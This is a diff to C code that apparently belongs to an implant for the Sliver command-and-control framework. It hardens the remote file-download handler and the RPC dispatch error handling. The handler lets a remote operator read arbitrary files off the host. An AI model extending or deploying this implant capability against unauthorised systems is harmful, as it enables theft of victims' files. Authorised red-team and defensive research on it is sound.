@@ -234,23 +234,33 @@ int sliver_rpc_handle_download(const sliver_envelope_t *req, sliver_buf_t *out) 
   int64_t limit = SLIVER_DOWNLOAD_CHUNK;
   int64_t stop = 0;
   int exists;
+  int is_dir = 0;
   int rc;
 
+  sliver_buf_init(&chunk);
   if (sliver_download_req_decode(req->data, req->data_len, &dl) != 0) {
     return -1;
   }
-  sliver_buf_init(&chunk);
+  if (dl.start < 0) {
+    return sliver_download_encode(out, dl.path, 0, 0, 0, NULL, 0, 0,
+                                  "download: negative offset");
+  }
   exists = sliver_fs_exists(dl.path);
-  if (exists) {
+  is_dir = sliver_fs_is_dir(dl.path);
+  if (exists && !is_dir) {
     if (dl.stop > dl.start && dl.stop - dl.start < limit) {
       limit = dl.stop - dl.start;
+    }
+    /* Honour MaxBytes (e.g. `head -c` style requests). */
+    if (dl.max_bytes > 0 && dl.max_bytes < limit) {
+      limit = dl.max_bytes;
     }
     (void)sliver_fs_read_chunk(dl.path, dl.start, limit, &chunk);
     stop = dl.start + (int64_t)chunk.len;
   } else {
     stop = dl.start;
   }
-  rc = sliver_download_encode(out, dl.path, exists, dl.start, stop, chunk.data, chunk.len, 0,
+  rc = sliver_download_encode(out, dl.path, exists, dl.start, stop, chunk.data, chunk.len, is_dir,
                               exists ? NULL : "download: no such file");
   sliver_buf_free(&chunk);
   return rc;
@@ -447,8 +457,11 @@ void sliver_rpc_dispatch(const sliver_envelope_t *req, sliver_rpc_result_t *resu
       } else if (hrc == 0) {
         result->resp_type = g_handlers[i].resp_type;
       } else {
+        /* Handler failed: let the peer see UnknownMessageType instead of an
+         * empty (and meaningless) response of the expected type. */
         LOG_ERROR("rpc: handler for type %u failed", req->type);
-        result->resp_type = g_handlers[i].resp_type;
+        result->handled = 0;
+        result->resp_type = 0;
         sliver_buf_free(&result->message);
         sliver_buf_init(&result->message);
       }
@@ -456,6 +469,7 @@ void sliver_rpc_dispatch(const sliver_envelope_t *req, sliver_rpc_result_t *resu
     return;
   }
 }
+
 
 
 
